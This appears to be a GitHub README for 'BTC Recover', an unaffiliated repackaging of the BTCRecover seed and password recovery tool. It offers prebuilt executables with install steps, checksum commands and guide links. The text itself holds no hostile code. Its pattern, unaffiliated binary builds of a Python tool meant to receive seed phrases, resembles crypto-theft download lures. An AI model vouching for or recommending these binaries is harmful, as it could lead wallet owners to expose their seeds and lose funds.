<h1 align="center">BTC Recover</h1>
<p align="center">Free, open-source wallet recovery that runs offline on Windows, macOS and Linux, built on BTCRecover.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/blob/master/LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FBB034?style=for-the-badge&labelColor=1C1E22" alt="License GPL-2.0"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0"><img src="https://img.shields.io/badge/RELEASE-v2.1.0-FBB034?style=for-the-badge&labelColor=1C1E22" alt="Release v2.1.0"></a>
</p>

---

## ⬇️ Downloads - v2.1.0

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

Checksums for every file are published on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0); compare before you run anything.

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 🛠️ Install

<details open>
<summary>🪟 Windows</summary>

1. Download [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) from the release.
2. Compare its SHA-256 with the value on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0):
   ```powershell
   Get-FileHash .\btc-recover-v2.1.0.exe -Algorithm SHA256
   ```
3. Run the installer and follow the screens.
4. Switch off the internet (turn off Wi-Fi, unplug the cable) before you enter any seed word, password or wallet file.

</details>

<details>
<summary>🍎 macOS</summary>

1. Download [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg).
2. Check the SHA-256 in Terminal and compare it with the release page:
   ```bash
   shasum -a 256 btc-recover-v2.1.0.dmg
   ```
3. Open the disk image and drag BTC Recover into Applications.
4. Switch off the internet before entering any recovery data.

</details>

<details>
<summary>🐧 Linux</summary>

1. Download [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip).
2. Check the SHA-256 and compare it with the release page:
   ```bash
   sha256sum btc-recover-v2.1.0.zip
   ```
3. Unzip the archive and run the program inside:
   ```bash
   unzip btc-recover-v2.1.0.zip -d btc-recover
   ```
4. Switch off the internet before entering any recovery data.

</details>

---

## ✨ Features

- Recovers missing and mistyped seed words, words in the wrong order, wallet passwords, BIP39 passphrases and BIP38 keys
- Works with BIP39 wallets such as Ledger and Trezor, plus Bitcoin Core, Electrum, MetaMask, Blockchain.com and MultiBit wallet files
- Point-and-click window plus a full command line
- Runs fully offline on your own computer; no account, no fee on recovered funds
- Optional GPU acceleration via OpenCL
- Free and open source, for Windows, macOS and Linux

---

## 📚 Guides

| Guide | What it covers |
|---|---|
| [Install BTC Recover on Windows](https://github.com/btc-recover-tool/learn/blob/main/how-to/install-btc-recover-on-windows.md) | Download, check and install the Windows build step by step. |
| [Find missing seed words with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/find-missing-seed-words-btc-recover.md) | Recover one, two or three missing words from a phrase. |
| [Recover a wallet password with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/recover-wallet-password-btc-recover.md) | Rebuild a half-remembered wallet password. |
| [Verify a BTC Recover download with SHA-256](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md) | Check that your installer matches the published fingerprint. |
| [BTC Recover BIP39 passphrase recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bip39-passphrase-recovery.md) | Recover the extra passphrase on top of a seed. |

➡️ [All guides in the learn hub](https://github.com/btc-recover-tool/learn)

---

## 🔒 Security

**BTC Recover never asks for your seed phrase online: anyone who does, by message, email or website, is trying to steal it.**

BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either.

---

## 💬 Support

Questions or problems? Open an issue on the [BTC Recover issue tracker](https://github.com/btc-recover-tool/BTC-Recover/issues).

Main app: [BTC Recover repository](https://github.com/btc-recover-tool/BTC-Recover) · Guides: [learn hub](https://github.com/btc-recover-tool/learn)

---

## ℹ️ About

Repository: decrypt-bitcoin-seed · Language: Python. Part of the BTC Recover GitHub account.

---

## 📄 License

GPL-2.0. See [LICENSE](https://github.com/btc-recover-tool/decrypt-bitcoin-seed/blob/HEAD/LICENSE).
